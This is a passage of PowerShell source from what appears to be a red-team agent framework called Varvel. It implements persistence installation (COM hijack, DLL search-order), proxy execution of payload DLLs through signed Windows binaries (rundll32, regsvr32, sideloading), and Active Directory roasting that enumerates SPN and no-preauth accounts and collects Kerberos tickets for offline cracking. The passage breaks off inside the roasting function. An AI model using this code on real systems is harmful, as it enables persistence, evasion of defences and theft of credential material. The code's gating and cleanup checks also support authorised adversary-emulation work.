      if ($Techniques.Count -gt 1) { throw 'persist-install: a deep technique (' + ($deepTechs -join ', ') + ') installs ALONE - one deliberate parameterized op per task; no mixing with classic techniques or a second deep technique' }
      Assert-VvDeepParams $deepTechs[0] $Deep
    } elseif ($null -ne $Deep) { throw 'persist-install: "deep" params require a deep technique (comhijack, dllsearch) in techniques' }
    if (-not $Target -or $Target.Trim().Length -eq 0) { throw 'persist-install: no relaunch target captured agent-side - persistence must relaunch the SAME agent with the SAME config; without a captured launch line there is nothing honest to install' }
    $targets = $Techniques
    foreach ($t in $targets) {
      if ($knownClassic -contains $t) { $techMap[$t] = Install-VvPersistTechOne $t $Name $Target $manifest $Overwrite }
      else {
        $key = Get-VvDeepEntryKey $t $Deep
        if ($t -eq 'comhijack') { $techMap[$key] = Install-VvDeepComHijack $key $Name $Deep $manifest $Overwrite }
        else { $techMap[$key] = Install-VvDeepDllSearch $key $Name $Deep $manifest $Overwrite $ManifestPath }
      }
    }
  } elseif ($Op -eq 'status') {
    if ($null -eq $Techniques -or $Techniques.Count -eq 0) {
      $targets = @($manifest.entries.Keys)
      foreach ($t in $knownClassic) { if ($targets -notcontains $t) { $targets += $t } }
    } else {
      foreach ($t in $Techniques) { if ($known -notcontains $t) { throw "unknown persist technique: $t" } }
      $targets = $Techniques
    }
    foreach ($t in $targets) {
      foreach ($row in (Expand-VvPersistTarget $t $Deep $manifest $knownClassic $knownDeep)) {
        if ($knownClassic -contains $row.tech) { $techMap[$row.key] = Get-VvPersistStatusOne $row.tech $Name $manifest $Target }
        else { $techMap[$row.key] = Get-VvDeepStatusOne $row.key $row.tech $Name $row.deep $manifest $Prove $ManifestPath }
      }
    }
  } elseif ($Op -eq 'remove') {
    if ($All) {
      $targets = @($manifest.entries.Keys)
      foreach ($t in $knownClassic) { if ($targets -notcontains $t) { $targets += $t } } # probe by name even without an entry (idempotent, verified-clean)
    } else {
      if ($null -eq $Techniques -or $Techniques.Count -eq 0) { throw 'persist-remove: techniques is empty - give techniques or all:true (removal is never ambiguous)' }
      foreach ($t in $Techniques) { if ($known -notcontains $t) { throw "unknown persist technique: $t" } }
      $targets = $Techniques
    }
    foreach ($t in $targets) {
      foreach ($row in (Expand-VvPersistTarget $t $Deep $manifest $knownClassic $knownDeep)) {
        if ($knownClassic -contains $row.tech) { $techMap[$row.key] = Remove-VvPersistTechOne $row.tech $Name $manifest $Target }
        else { $techMap[$row.key] = Remove-VvDeepTechOne $row.key $row.tech $Name $row.deep $manifest $ManifestPath }
      }
    }
  } else {
    throw "unknown persist op: $Op (want install | status | remove | audit)"
  }
  $manifestSaved = Write-VvPersistManifest $ManifestPath $manifest
  if (-not $manifestSaved -and $ManifestPath) {
    foreach ($k in $techMap.Keys) { $techMap[$k].note = ([string]$techMap[$k].note + ' MANIFEST WRITE FAILED - the on-disk removal record is degraded (locations are still deterministic by name; re-run persist-status to re-record)').Trim() }
  }
  # Aggregate state: 'failed' if ANY failed/removal-failed (a partial or unverified
  # result is never dressed up as a win); 'refused' if any governed refusal; else the
  # op's success state; status aggregates installed/absent/mixed from the per-technique truth.
  $states = @($techMap.Values | ForEach-Object { [string]$_.state })
  if (($states | Where-Object { $_ -eq 'failed' -or $_ -eq 'removal-failed' }).Count -gt 0) { $agg = 'failed' }
  elseif (($states | Where-Object { $_ -eq 'refused-clobber' -or $_ -eq 'refused-foreign' }).Count -gt 0) { $agg = 'refused' }
  elseif ($Op -eq 'install') { $agg = 'installed' }
  elseif ($Op -eq 'remove') { $agg = 'removed' }
  else {
    if (($states | Where-Object { $_ -eq 'installed' }).Count -eq $states.Count) { $agg = 'installed' }
    elseif (($states | Where-Object { $_ -eq 'absent' -or $_ -eq 'removed' }).Count -eq $states.Count) { $agg = 'absent' }
    else { $agg = 'mixed' }
  }
  $result = [ordered]@{ op = $Op; pid = $PID; state = $agg; techniques = $techMap; at = [DateTime]::UtcNow.ToString('o') }
  return ($result | ConvertTo-Json -Compress -Depth 8)
}

# ==PERSIST-LIB== end ------------------------------------------------------------------

# ==EXECPROXY-LIB== begin (mirror: agents/varvel-agent.ps1) ---------------------------

function Get-VvProxySha256Hex([string]$Text) {
  $s = [System.Security.Cryptography.SHA256]::Create()
  try { return ([BitConverter]::ToString($s.ComputeHash([Text.Encoding]::UTF8.GetBytes($Text)))).Replace('-','').ToLower() }
  finally { $s.Dispose() }
}
function Get-VvProxyTag([string]$Seed) { return 'VARVEL-' + (Get-VvProxySha256Hex $Seed).Substring(0, 8) }
function Test-VvProxyName([string]$Name) { return ([string]$Name -match '^[A-Za-z0-9][A-Za-z0-9_.-]{0,39}$') }

# File probe: @{Present;Sha256} — $null on a probe FAULT (a failed probe is never
# treated as absence; the caller turns $null into a loud unverified state).
function Probe-VvProxyFile([string]$Path) {
  try {
    if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) { return @{ Present = $false; Sha256 = $null } }
    $h = (Get-FileHash -LiteralPath $Path -Algorithm SHA256 -ErrorAction Stop).Hash.ToLower()
    return @{ Present = $true; Sha256 = $h }
  } catch { return $null }
}

# The signed host's Authenticode evidence (READ-ONLY) — the "a Microsoft-signed
# binary really loaded our code" claim rides on this being reported honestly.
function Get-VvProxySig([string]$Path) {
  try {
    $sig = Get-AuthenticodeSignature -LiteralPath $Path -ErrorAction Stop
    $signer = ''
    if ($sig.SignerCertificate -and $sig.SignerCertificate.Subject) { $signer = [string]$sig.SignerCertificate.Subject }
    return @{ Status = [string]$sig.Status; Signer = $signer }
  } catch { return @{ Status = 'unreadable'; Signer = '' } }
}

function Get-VvProxyPlantDir([string]$Sandbox, [string]$Name) { return (Join-Path $Sandbox ('execproxy-' + $Name)) }

function Read-VvProxyManifest([string]$Path) {
  $m = @{ version = 1; entries = @{} }
  try {
    if (Test-Path -LiteralPath $Path -PathType Leaf) {
      $j = (Get-Content -LiteralPath $Path -Raw -ErrorAction Stop) | ConvertFrom-Json -ErrorAction Stop
      if ($j.entries) { foreach ($p in $j.entries.PSObject.Properties) { $m.entries[$p.Name] = $p.Value } }
    }
  } catch { <# a corrupt manifest is degraded honestly: entries re-record on next op #> }
  return $m
}
function Write-VvProxyManifest([string]$Path, $Manifest) {
  $obj = @{ version = 1; entries = $Manifest.entries }
  ($obj | ConvertTo-Json -Compress -Depth 8) | Set-Content -LiteralPath $Path -Encoding UTF8 -ErrorAction Stop
}

function New-VvProxyEv([string]$Technique) {
  return [ordered]@{
    state = 'failed'; technique = $Technique; command = $null
    dllSha256 = $null; hostSha256 = $null; hostSigStatus = $null; hostSigner = $null
    exitCode = $null; outputTail = $null; markerVerified = $false; stillRunning = $false
    files = @(); installVerified = $null; removalVerified = $null; note = $null; error = $null
  }
}

# Run one signed-proxy op for a name handle. Mirrors ExecProxyStore.run() in
# engine/execproxy.mjs step for step: payload proof -> pre-plant snapshot with
# foreign-clobber refusal -> plant verified by sha256 re-read -> signed-host exec.
function Invoke-VvProxyRunOne([string]$Name, $Job, $Manifest) {
  $tech = ([string]$Job.technique).ToLower()
  $ev = New-VvProxyEv $tech
  $dll = [string]$Job.dll
  $export = [string]$Job.export
  $args = [string]$Job.args
  if ($args.Contains('"')) { $ev.error = 'args must not contain double quotes - the rundll32 quoting doctrine keeps the arg tail a single literal token'; return $ev }
  # 1. THE PAYLOAD: must exist and hash. No payload, no run.
  $dllProbe = Probe-VvProxyFile $dll
  if ($null -eq $dllProbe) { $ev.error = "payload probe failed for $dll - nothing executed"; return $ev }
  if (-not $dllProbe.Present -or -not $dllProbe.Sha256) { $ev.error = "payload DLL not found or unhashable at $dll - stage it into the governed sandbox first (nothing executed)"; return $ev }
  $ev.dllSha256 = $dllProbe.Sha256

  $hostExe = $null
  $argvDisplay = $null
  if ($tech -eq 'rundll32') {
    $hostExe = Join-Path $env:SystemRoot 'System32\rundll32.exe'
    # QUOTING DOCTRINE (measured 2026-08-18, Win11 24H2, System32\rundll32.exe):
    # rundll32 re-parses its own command line and DECLINES THE LOAD when the
    # "<dll>,<Export>" token is QUOTED (the leading quote becomes part of the DLL
    # name on its parse path). The entry spec and the arg tail ride as separate
    # UNQUOTED tokens - so stage 1 requires SPACE-FREE paths (refused loudly here).
    if ($dll.Contains(' ') -or $args.Contains(' ')) {
      $ev.error = 'rundll32-class requires SPACE-FREE dll/args paths (the measured rundll32 quoting doctrine: quoted tokens are declined by its own command-line reparse) - stage under a space-free sandbox path'
      return $ev
    }
    $argvDisplay = $hostExe + ' ' + $dll + ',' + $export + $(if ($args.Length -gt 0) { ' ' + $args } else { '' })
    $ev.note = 'signed-host direct load (rundll32-class). LOLBin-detectable behavior - the detection oracle grades it.'
  } elseif ($tech -eq 'regsvr32') {
    $hostExe = Join-Path $env:SystemRoot 'System32\regsvr32.exe'
    $argvDisplay = '"' + $hostExe + '" /s "' + $dll + '"'
    $ev.note = 'regsvr32-class load-only (DllRegisterServer, S_OK, no registration side effects). Measured caveat: regsvr32 reports a nonzero exit despite our S_OK return and may linger - the load-and-call is the proof; rundll32-class is the clean leg.'
  } elseif ($tech -eq 'sideload') {
    $hostExe = [string]$Job.host
  } else {
    $ev.error = "unknown execproxy technique: $tech (stage 1 ships rundll32, regsvr32, sideload only)"; return $ev
  }

  # 2. Host proof + signature evidence (the Microsoft-signed claim is REPORTED, never assumed).
  $hostProbe = Probe-VvProxyFile $hostExe
  if ($null -eq $hostProbe -or -not $hostProbe.Present -or -not $hostProbe.Sha256) {
    $ev.error = "signed host not found or unhashable at $hostExe - nothing executed"; return $ev
  }
  $ev.hostSha256 = $hostProbe.Sha256
  $sig = Get-VvProxySig $hostExe
  $ev.hostSigStatus = $sig.Status; $ev.hostSigner = $sig.Signer

  # 3. SIDELOAD PLANTS (copies only, sandbox-confined): snapshot first, refuse foreign.
  $plantDir = $null
  if ($tech -eq 'sideload') {
    $as = ([string]$Job.as).ToLower()
    $plantDir = Get-VvProxyPlantDir ([string]$Job.sandbox) $Name
    $hostBase = Split-Path $hostExe -Leaf
    $targets = @(
      @{ role = 'host-copy'; path = (Join-Path $plantDir $hostBase); src = $hostExe; want = $ev.hostSha256 },
      @{ role = 'dll-as'; path = (Join-Path $plantDir $as); src = $dll; want = $ev.dllSha256 }
    )
    foreach ($t in $targets) {
      $rec = [ordered]@{ role = $t.role; path = $t.path; sha256 = $null; present = $false; planted = $false; removalVerified = $null; state = $null }
      $pre = Probe-VvProxyFile $t.path
      if ($null -ne $pre -and $pre.Present) {
        $rec.present = $true; $rec.sha256 = $pre.Sha256
        if ($pre.Sha256 -ne $t.want) {
          $ev.files += $rec
          $ev.state = 'refused-clobber'
          $ev.error = "plant target already holds FOREIGN bytes (sha256 $($pre.Sha256.Substring(0,12))...): $($t.path) - REFUSED to clobber it silently. execproxy-remove this name first, or pick another name handle."
          return $ev
        }
        $rec.planted = $true; $rec.state = 'planted' # idempotent: ours and intact
        $ev.files += $rec
        continue
      }
      try {
        if (-not (Test-Path -LiteralPath $plantDir)) { New-Item -ItemType Directory -Force -Path $plantDir -ErrorAction Stop | Out-Null }
        Copy-Item -LiteralPath $t.src -Destination $t.path -Force -ErrorAction Stop
      } catch {
        $ev.files += $rec
        $ev.error = "plant write failed for $($t.path): $($_.Exception.Message) - nothing claimed"
        return $ev
      }
      $post = Probe-VvProxyFile $t.path
      if ($null -eq $post -or -not $post.Present -or $post.Sha256 -ne $t.want) {
        $rec.present = ($null -ne $post -and $post.Present); $rec.sha256 = $(if ($post) { $post.Sha256 } else { $null })
        $ev.files += $rec
        $ev.error = "plant write did NOT verify (sha256 re-read mismatch) for $($t.path) - the plant is UNVERIFIED, reported honestly; remove will still take this entry back"
        Save-VvProxyEntry $Name $ev $Manifest 'failed'
        return $ev
      }
      $rec.present = $true; $rec.sha256 = $post.Sha256; $rec.planted = $true; $rec.state = 'planted'
      $ev.files += $rec
    }
    $ev.installVerified = $true
    $argvDisplay = '"' + (Join-Path $plantDir $hostBase) + '"' + $(if ($args.Length -gt 0) { ' "' + $args + '"' } else { '' })
    $hostExe = Join-Path $plantDir $hostBase
    $ev.note = 'search-order plant (sideload-class): host copy + DLL-as-name, sandbox-confined. Whether the host actually loads the planted name is MEASURED (marker/edrview), never claimed.'
  } else {
    $ev.files += [ordered]@{ role = 'payload'; path = $dll; sha256 = $ev.dllSha256; present = $true; planted = $false; removalVerified = $null; state = 'present' }
  }
  $ev.command = $argvDisplay

  # 4. EXECUTE through the signed host. rundll32/regsvr32 wait briefly; a blocking
  #    VarvelRun leg stays running BY DESIGN (stillRunning is reported honestly).
  #    rundll32's arg string is UNQUOTED per the measured quoting doctrine (the
  #    space-free check already refused anything that would need quotes).
  $argString = $null
  if ($tech -eq 'rundll32') { $argString = $dll + ',' + $export + $(if ($args.Length -gt 0) { ' ' + $args } else { '' }) }
  elseif ($tech -eq 'regsvr32') { $argString = '/s "' + $dll + '"' }
  else { $argString = $(if ($args.Length -gt 0) { '"' + $args + '"' } else { '' }) }
  try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $hostExe
    $psi.Arguments = $argString
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $p = [System.Diagnostics.Process]::Start($psi)
  } catch {
    $ev.error = "signed-host launch failed: $($_.Exception.Message)"
    Save-VvProxyEntry $Name $ev $Manifest 'failed'
    return $ev
  }
  $waitMs = 15000
  if ($tech -eq 'sideload') { $waitMs = 5000 } # a sideloaded VarvelRun blocks forever - that IS the agent
  $exited = $p.WaitForExit($waitMs)
  if ($exited) {
    $ev.exitCode = $p.ExitCode
  } else {
    $ev.stillRunning = $true
    if ($tech -eq 'regsvr32' -or $tech -eq 'rundll32') {
      # The documented regsvr32 linger (Go c-shared cannot unload) — the call already
      # happened; the host is killed so the plant set stays file-accountable.
      try { $p.Kill() } catch {}
      $p.WaitForExit()
      $ev.note += ' Host lingered after the call window and was killed (reported honestly).'
    }
  }
  # 5. The load-and-ran proof: VarvelStatus drops its marker JSON at the args path.
  if ($tech -eq 'rundll32' -and $export -eq 'VarvelStatus' -and $args.Length -gt 0) {
    $mk = Probe-VvProxyFile $args
    if ($null -ne $mk -and $mk.Present) {
      try {
        $mj = (Get-Content -LiteralPath $args -Raw -ErrorAction Stop) | ConvertFrom-Json -ErrorAction Stop
        if ($mj.marker -eq 'varvel-agent-dll') { $ev.markerVerified = $true }
      } catch { <# a file that is not our marker is not our proof #> }
    }
    if (-not $ev.markerVerified) { $ev.note += ' WARNING: the VarvelStatus marker was NOT observed at the args path - the load-and-ran proof is UNVERIFIED (reported honestly).' }
  }
  $ev.state = 'ran'
  Save-VvProxyEntry $Name $ev $Manifest 'ran'
  return $ev
}

function Save-VvProxyEntry([string]$Name, $Ev, $Manifest, [string]$State) {
  $prev = $Manifest.entries[$Name]
  $Manifest.entries[$Name] = [ordered]@{
    name = $Name; technique = $Ev.technique; command = $Ev.command
    dllSha256 = $Ev.dllSha256; hostSha256 = $Ev.hostSha256
    files = @($Ev.files | ForEach-Object { [ordered]@{ role = $_.role; path = $_.path; sha256 = $_.sha256; planted = ($_.planted -eq $true) } })
    state = $State
    ranAt = $(if ($prev -and $prev.ranAt) { [string]$prev.ranAt } else { [DateTime]::UtcNow.ToString('o') })
    exitCode = $Ev.exitCode
    removedAt = $null; removalVerified = $null
  }
}

# Remove one name handle. Mirrors ExecProxyStore.remove(): delete ONLY files whose
# live hash still matches what we planted; verify ABSENCE by re-read; a hash-changed
# plant is a loud refused-foreign; an unverifiable removal is removal-failed (LOUD).
function Invoke-VvProxyRemoveOne([string]$Name, $Manifest, [string]$Sandbox) {
  $entry = $Manifest.entries[$Name]
  $ev = New-VvProxyEv $(if ($entry) { [string]$entry.technique } else { $null })
  if (-not $entry) {
    $ev.state = 'removed'; $ev.removalVerified = $true
    $ev.note = 'nothing was ever run under this name handle - verified clean (no manifest entry)'
    return $ev
  }
  $ev.command = [string]$entry.command; $ev.dllSha256 = [string]$entry.dllSha256; $ev.hostSha256 = [string]$entry.hostSha256
  $planted = @($entry.files | Where-Object { $_.planted -eq $true })
  if ($planted.Count -eq 0) {
    $ev.state = 'removed'; $ev.removalVerified = $true
    $ev.note = "$( $entry.technique )-class plants nothing (the payload DLL is the pre-staged input artifact - it is NOT deleted by remove; it was never a plant)"
    $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o')
    return $ev
  }
  foreach ($f in $planted) {
    $rec = [ordered]@{ role = [string]$f.role; path = [string]$f.path; sha256 = $null; present = $false; planted = $true; removalVerified = $null; state = $null }
    $pre = Probe-VvProxyFile ([string]$f.path)
    if ($null -eq $pre) {
      $ev.files += $rec
      $ev.state = 'removal-failed'; $entry.state = 'removal-failed'; $entry.removalVerified = $false
      $ev.error = "pre-remove probe failed for $($f.path) - removal UNVERIFIED (LOUD; escalate)"
      return $ev
    }
    if ($pre.Present -and $pre.Sha256 -ne ([string]$f.sha256).ToLower()) {
      $rec.present = $true; $rec.sha256 = $pre.Sha256; $ev.files += $rec
      $ev.state = 'refused-foreign'
      $ev.error = "plant file now holds FOREIGN bytes (hash changed since plant): $($f.path) - REFUSED to delete what we did not write (LOUD; escalate to the operator)"
      return $ev
    }
    if ($pre.Present) {
      try { Remove-Item -LiteralPath ([string]$f.path) -Force -ErrorAction Stop }
      catch {
        $rec.present = $true; $ev.files += $rec
        $ev.state = 'removal-failed'; $entry.state = 'removal-failed'; $entry.removalVerified = $false
        $ev.error = "remove failed for $($f.path): $($_.Exception.Message) - removal UNVERIFIED (LOUD; escalate; a still-running sideloaded host holds its files locked - kill it first)"
        return $ev
      }
    }
    $post = Probe-VvProxyFile ([string]$f.path)
    $rec.removalVerified = ($null -ne $post -and -not $post.Present)
    $rec.present = ($null -ne $post -and $post.Present)
    $ev.files += $rec
    if (-not $rec.removalVerified) {
      $ev.state = 'removal-failed'; $entry.state = 'removal-failed'; $entry.removalVerified = $false
      $ev.error = "remove executed but $($f.path) is STILL PRESENT on re-read - CLEANUP-PROOF FAILED (loud, escalated to the operator; the engagement cannot be called clean)"
      return $ev
    }
  }
  # The plant dir itself goes last (only once every file is verified gone).
  $plantDir = Get-VvProxyPlantDir $Sandbox $Name
  try { if (Test-Path -LiteralPath $plantDir) { Remove-Item -LiteralPath $plantDir -Recurse -Force -ErrorAction Stop } } catch { <# a lingering dir is reported by status, never hidden #> }
  $ev.state = 'removed'; $ev.removalVerified = $true
  $ev.note = 'every planted file was deleted and re-read absent - the plant provably holds nothing of ours'
  $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o')
  return $ev
}

# Live status of one manifest entry (measured now, never remembered) - the same
# state vocabulary as ExecProxyStore.status().
function Get-VvProxyEntryStatus($Entry) {
  $anyPresent = $false; $anyTampered = $false; $anyUnknown = $false
  $files = @()
  foreach ($f in $Entry.files) {
    $cur = Probe-VvProxyFile ([string]$f.path)
    $rec = [ordered]@{ role = [string]$f.role; path = [string]$f.path; sha256 = $(if ($cur) { $cur.Sha256 } else { $null }); present = ($null -ne $cur -and $cur.Present); planted = ($f.planted -eq $true); removalVerified = $null; state = $null }
    if ($null -eq $cur) { $rec.state = 'unknown'; $anyUnknown = $true }
    elseif ($cur.Present -and $f.sha256 -and $cur.Sha256 -eq ([string]$f.sha256).ToLower()) { $rec.state = $(if ($rec.planted) { 'planted' } else { 'present' }); if ($rec.planted) { $anyPresent = $true } }
    elseif ($cur.Present) { $rec.state = 'tampered'; $anyTampered = $true; $anyPresent = $true }
    else { $rec.state = $(if ($rec.planted) { $(if ($Entry.removalVerified -eq $true) { 'removed'; $rec.removalVerified = $true } else { 'missing' }) } else { 'absent' }) }
    $files += $rec
  }
  $state = 'absent'; $note = ''
  if ($anyTampered) { $state = 'tampered'; $note = 'a planted file''s bytes CHANGED under us - reported honestly; removal refuses to delete foreign bytes' }
  elseif ($anyPresent) { $state = 'planted'; $note = 'plant files present and hash-intact at live re-read' }
  elseif ($anyUnknown) { $state = 'unknown'; $note = 'a probe failed - never assume absence' }
  elseif ($Entry.removalVerified -eq $true) { $state = 'removed'; $note = "verified absent (removal was proven at $($Entry.removedAt); still absent at this live re-read)" }
  elseif ($Entry.state -eq 'ran') { $state = 'missing'; $note = 'manifest says planted but the files are GONE - removed outside a verified remove op (out-of-band). Absence is measured now; the removal itself was never channel-verified.' }
  return @{ state = $state; note = $note; files = $files }
}

# The op dispatcher. Returns ONE JSON string, op first.
function Invoke-VvProxyOp([string]$Op, $Job) {
  $manifestPath = [string]$Job.manifestPath
  $sandbox = [string]$Job.sandbox
  $m = Read-VvProxyManifest $manifestPath
  $at = { [DateTime]::UtcNow.ToString('o') }
  if ($Op -eq 'run') {
    $name = [string]$Job.name
    if (-not (Test-VvProxyName $name)) { throw "execproxy-run: name '$name' is not a safe plant handle" }
    $ev = Invoke-VvProxyRunOne $name $Job $m
    try { Write-VvProxyManifest $manifestPath $m } catch { $ev.note = ([string]$ev.note + ' MANIFEST WRITE FAILED - the on-disk removal record is degraded (re-run execproxy-status to re-record)').Trim() }
    $state = $ev.state
    return ([ordered]@{ op = 'run'; pid = $PID; state = $state; names = @{ $name = $ev }; at = (& $at) } | ConvertTo-Json -Compress -Depth 8)
  }
  if ($Op -eq 'remove') {
    $names = @()
    if ($Job.all -eq $true) { $names = @($m.entries.Keys) }
    else { $names = @([string]$Job.name) }
    $out = @{}
    $worst = 'removed'
    foreach ($n in $names) {
      if (-not (Test-VvProxyName $n)) { throw "execproxy-remove: name '$n' is not a safe plant handle" }
      $ev = Invoke-VvProxyRemoveOne $n $m $sandbox
      $out[$n] = $ev
      if ($ev.state -eq 'removal-failed' -or $ev.state -eq 'refused-foreign') { $worst = $ev.state }
    }
    try { Write-VvProxyManifest $manifestPath $m } catch { <# degraded, reported in evidence notes #> }
    return ([ordered]@{ op = 'remove'; pid = $PID; state = $worst; names = $out; at = (& $at) } | ConvertTo-Json -Compress -Depth 8)
  }
  if ($Op -eq 'status') {
    $names = @()
    if ($Job.name -and ([string]$Job.name).Trim().Length -gt 0) { $names = @([string]$Job.name) } else { $names = @($m.entries.Keys) }
    $entries = @(); $open = @()
    foreach ($n in $names) {
      $entry = $m.entries[$n]
      if (-not $entry) {
        $entries += [ordered]@{ name = $n; technique = $null; state = 'absent'; removalVerified = $true; note = 'no manifest entry - nothing was ever run under this handle' }
        continue
      }
      $st = Get-VvProxyEntryStatus $entry
      $closed = ($entry.removalVerified -eq $true) -and -not (@($st.files | Where-Object { $_.present -eq $true -and $_.planted -eq $true }).Count -gt 0)
      $rec = [ordered]@{ name = $n; technique = [string]$entry.technique; command = [string]$entry.command; state = $st.state; removalVerified = ($entry.removalVerified -eq $true); ranAt = [string]$entry.ranAt; removedAt = $(if ($entry.removedAt) { [string]$entry.removedAt } else { $null }); files = $st.files; note = $st.note }
      if (-not $closed) { $rec.removalVerified = $false; $open += [ordered]@{ name = $n; technique = [string]$entry.technique; state = $st.state } }
      $entries += $rec
    }
    $clean = ($open.Count -eq 0)
    $note = $(if ($clean) { $(if ($entries.Count -eq 0) { 'no signed-proxy runs were ever recorded by this agent (empty manifest) - clean' } else { 'every recorded run is verified removed - the engagement signed-proxy footprint is clean' }) } else { "$($open.Count) name handle(s) still present or removal-unverified - the engagement CANNOT be called clean; run execproxy-remove and re-audit" })
    return ([ordered]@{ op = 'status'; pid = $PID; state = $(if ($clean) { 'clean' } else { 'unclean' }); clean = $clean; entries = $entries; open = $open; note = $note; at = (& $at) } | ConvertTo-Json -Compress -Depth 8)
  }
  throw "unknown execproxy op: $Op (want run | remove | status)"
}

# ==EXECPROXY-LIB== end ----------------------------------------------------------------

# ==ADROAST-LIB== begin ----------------------------------------------------------------
# GOVERNED AD TIER, rung 1 (agent leg): the ROAST COLLECTORS. The PURE core (LDAP
# targeting planner, Kerberos DER, hashcat/john formatters, gates) is
# engine/adroast.mjs - THIS lib is the thin Windows half:
#   enum       - DirectorySearcher against the DC with the engine's planned filters
#                (the filter constants below MUST match engine/adroast.mjs
#                planLdapTargeting - tests pin the canonical strings there).
#   kerberoast - .NET KerberosRequestorSecurityToken per SPN (Windows integrated
#                Kerberos does the crypto in the AGENT'S logon context - honest
#                boundary: the requests are ordinary Kerberos traffic, that is the
#                tradecraft point). The agent ships RAW AP-REQ bytes; parsing +
#                hashcat formatting happen CHANNEL-SIDE in tested Node code.
#   asrep      - a raw TCP/88 splat of the ENGINE-BUILT AS-REQ bytes (buildAsReq -
#                DER correctness never lives in PS). No creds, no crypto: the
#                DONT_REQ_PREAUTH mechanic IS that the KDC answers anyone.
# HONEST BOUNDARY: we COLLECT and FORMAT; cracking is OFFLINE operator-side
# tooling. -AllowAdRoast is the agent-side half of the gate (engagement ad.roast
# is the other). edrview grades what the DC/defender logged (4768/4769).
$script:VvAdFilterSpn = '(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'
$script:VvAdFilterNoPre = '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'

function Get-VvAdCredential($Job) {
  if ($Job.ldapUser -and ([string]$Job.ldapUser).Trim().Length -gt 0) {
    $u = [string]$Job.ldapUser
    if ($Job.ldapDomain -and ([string]$Job.ldapDomain).Trim().Length -gt 0) { $u = ([string]$Job.ldapDomain).Trim() + '\' + $u }
    $sec = ConvertTo-SecureString ([string]$Job.ldapPassword) -AsPlainText -Force
    return (New-Object System.Management.Automation.PSCredential($u, $sec))
  }
  return $null
}

function Invoke-VvAdEnum([string]$Dc, [string]$Filter, $Cred, [bool]$MarkNoPreAuth) {
  Add-Type -AssemblyName System.DirectoryServices
  $entry = if ($Cred) { New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Dc", $Cred.UserName, $Cred.GetNetworkCredential().Password) } else { New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Dc") }
  $ds = New-Object System.DirectoryServices.DirectorySearcher($entry, $Filter)
  $ds.PageSize = 512
  $ds.SizeLimit = 256
  $accounts = @()
  foreach ($r in $ds.FindAll()) {
    $p = $r.Properties
    $user = if ($p['samaccountname'].Count -gt 0) { [string]$p['samaccountname'][0] } else { $null }
    if (-not $user) { continue }
    $uac = 0; if ($p['useraccountcontrol'].Count -gt 0) { $uac = [int]$p['useraccountcontrol'][0] }
    if (($uac -band 2) -ne 0) { continue } # ACCOUNTDISABLE - the filter excludes these; belt-and-braces
    $spns = @(); foreach ($s in $p['serviceprincipalname']) { $spns += [string]$s }
    $groups = @(); foreach ($g in $p['memberof']) { $groups += [string]$g }
    $ac = 0; if ($p['admincount'].Count -gt 0 -and [string]$p['admincount'][0] -eq '1') { $ac = 1 }
    $accounts += @{ user = $user; spns = $spns; adminCount = $ac; groups = $groups; noPreAuth = $MarkNoPreAuth }
  }
  return $accounts
}

function Invoke-VvKerberoastTicket([string]$Spn) {
  Add-Type -AssemblyName System.IdentityModel
  $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $Spn
  $bytes = $token.GetRequest()   # the GSS-API-framed AP-REQ - the service ticket rides inside it
  return [Convert]::ToBase64String($bytes)
}

function Invoke-VvAsReqSplat([string]$Dc, [byte[]]$ReqBytes, [int]$TimeoutMs) {
  $c = New-Object System.Net.Sockets.TcpClient
  try {
    $iar = $c.BeginConnect($Dc, 88, $null, $null)
    if (-not $iar.AsyncWaitHandle.WaitOne($TimeoutMs)) { throw "connect timeout ($($TimeoutMs)ms)" }
    $c.EndConnect($iar)
    $c.ReceiveTimeout = $TimeoutMs; $c.SendTimeout = $TimeoutMs
    $st = $c.GetStream()
    $len = $ReqBytes.Length
    $frame = New-Object byte[] ($len + 4)
    $frame[0] = ($len -shr 24) -band 0xff; $frame[1] = ($len -shr 16) -band 0xff; $frame[2] = ($len -shr 8) -band 0xff; $frame[3] = $len -band 0xff
    [Array]::Copy($ReqBytes, 0, $frame, 4, $len)
    $st.Write($frame, 0, $frame.Length)
    $hdr = New-Object byte[] 4
    $read = 0; while ($read -lt 4) { $n = $st.Read($hdr, $read, 4 - $read); if ($n -le 0) { throw 'KDC closed mid-read' }; $read += $n }
    $want = ($hdr[0] -shl 24) -bor ($hdr[1] -shl 16) -bor ($hdr[2] -shl 8) -bor $hdr[3]
    if ($want -le 0 -or $want -gt 1048576) { throw "implausible KDC frame length $want" }
    $resp = New-Object byte[] $want
    $read = 0; while ($read -lt $want) { $n = $st.Read($resp, $read, $want - $read); if ($n -le 0) { throw 'KDC closed mid-read' }; $read += $n }
    return [Convert]::ToBase64String($resp)
  } finally { try { $c.Close() } catch {} }
}

# One roast op -> ONE op-first JSON evidence line (the channel intake parses exactly
# this shape: {op, pid, dc, realm, accounts, tickets|reps, errors, at}).
function Invoke-VvAdRoastOp([string]$Op, $Job) {
  $result = [ordered]@{ op = $Op; pid = $PID; dc = [string]$Job.dc; realm = $(if ($Job.realm) { ([string]$Job.realm).ToUpper() } else { $null }); accounts = @(); errors = @() }
  $errs = @()
  $cred = Get-VvAdCredential $Job
  $accounts = @()
  if ($Op -eq 'enum' -or ($Op -eq 'kerberoast' -and -not $Job.accounts)) {
    try { $accounts += @(Invoke-VvAdEnum ([string]$Job.dc) $script:VvAdFilterSpn $cred $false) }
    catch { $errs += ('spn-accounts enum failed: ' + ($_.Exception.Message -replace '[\r\n]+', ' ')) }
    if ($Op -eq 'enum') {
      try { $accounts += @(Invoke-VvAdEnum ([string]$Job.dc) $script:VvAdFilterNoPre $cred $true) }
      catch { $errs += ('no-preauth-accounts enum failed: ' + ($_.Exception.Message -replace '[\r\n]+', ' ')) }
    }
  }
  $result.accounts = $accounts
  if ($Op -eq 'kerberoast') {
    $reqs = @()
